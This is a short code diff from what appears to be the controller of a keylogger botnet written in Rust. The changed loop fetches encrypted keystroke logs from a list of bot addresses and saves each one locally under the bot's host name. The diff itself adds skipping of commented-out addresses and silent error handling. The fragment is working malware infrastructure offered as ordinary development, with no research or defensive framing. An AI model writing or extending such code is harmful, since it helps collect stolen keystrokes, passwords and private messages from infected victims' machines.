@@ -69,7 +69,10 @@ fn main() {
         std::fs::File::open(args.values_of("PUB_KEY").unwrap().collect::<Vec<&str>>()[0]).expect("Wrong public file").read_to_end(&mut public_key).unwrap();
         //TODO: make retrieval streamified
         let encrypted_data_paths: Vec<Vec<std::path::PathBuf>> = bot_addr_list.iter().map(|bot_addr| {
-            retrieve_remote_keylogs(bot_addr, &public_key).iter().map(|&(ref name, ref data)| {
+            if bot_addr.starts_with("#") {
+                return vec![];
+            }
+            retrieve_remote_keylogs(bot_addr, &public_key).unwrap_or_else(|e| {return vec![];}).iter().map(|&(ref name, ref data)| {
                 use std::io::Write;
                 let output_path = retrieve_path.join(format!("{}_{}", bot_addr.split(":").collect::<Vec<&str>>()[0], name));
 
